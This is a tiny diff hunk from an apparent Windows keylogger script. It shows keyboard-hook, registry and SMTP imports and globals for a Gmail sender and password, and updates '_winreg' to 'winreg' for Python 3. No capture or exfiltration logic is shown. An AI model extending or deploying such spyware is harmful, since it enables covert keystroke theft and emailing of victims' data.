@@ -15,7 +15,7 @@ d8'   .8P 88.  .88 88.  .88 88    88 88   88   88.  .88
 import sys
 import win32api,pythoncom
 import pyHook,os,time,random,smtplib,string,base64
-from _winreg import *
+from winreg import * #Changed _winreg to winreg and made it work.
 
 global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
 
